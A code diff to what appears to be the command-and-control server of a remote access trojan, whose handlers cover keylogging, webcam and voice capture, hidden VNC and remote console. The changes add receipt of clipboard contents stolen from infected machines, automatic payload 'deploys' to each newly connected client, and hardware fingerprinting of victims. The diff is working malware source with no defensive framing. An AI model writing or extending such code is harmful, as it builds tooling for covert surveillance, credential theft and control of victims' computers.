@@ -52,6 +52,7 @@ type WsLifecycleDeps = {
   handleKeyloggerViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   handleVoiceViewerMessage: (ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) => void;
   dispatchAutoScriptsForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
+  dispatchAutoDeploysForConnection: (info: ClientInfo, ws: ServerWebSocket<SocketData>) => void;
   dispatchAutoLoadPlugins: (info: ClientInfo) => void;
   takePendingNotificationScreenshot: (clientId: string) => any;
   storeNotificationScreenshot: (
@@ -77,6 +78,7 @@ type WsLifecycleDeps = {
   handleWebcamDevices: (clientId: string, payload: any) => void;
   handleHVNCCloneProgress: (clientId: string, payload: any) => void;
   handleHVNCLookupResult: (clientId: string, payload: any) => void;
+  handleClipboardContent: (clientId: string, payload: any) => void;
   cleanupVoiceViewer: (ws: ServerWebSocket<SocketData>) => void;
   stopConsoleOnTarget: (target: ClientInfo | undefined, sessionId: string) => void;
   sendDesktopCommand: (target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) => void;
@@ -291,6 +293,9 @@ export async function handleWebSocketMessage(
             version: (payload as any).version || undefined,
             user: (payload as any).user || undefined,
             monitors: (payload as any).monitors || undefined,
+            cpu: (payload as any).cpu || undefined,
+            gpu: (payload as any).gpu || undefined,
+            ram: (payload as any).ram || undefined,
             country,
             lastSeen: Date.now(),
             online: 0 as any,
@@ -371,6 +376,7 @@ export async function handleWebSocketMessage(
         clientManager.addClient(infoObj.id, infoObj);
 
         deps.dispatchAutoScriptsForConnection(infoObj, ws);
+        deps.dispatchAutoDeploysForConnection(infoObj, ws);
         deps.dispatchAutoLoadPlugins(infoObj);
         deps.notifyDashboard();
         deps.notifyDashboardClientEvent("client_online", {
@@ -528,6 +534,9 @@ export async function handleWebSocketMessage(
         break;
       case "hvnc_lookup_result":
         deps.handleHVNCLookupResult(client.id, payload);
+        break;
+      case "clipboard_content":
+        deps.handleClipboardContent(client.id, payload);
         break;
       case "proxy_data": {
         const connId = (payload as any).connectionId;
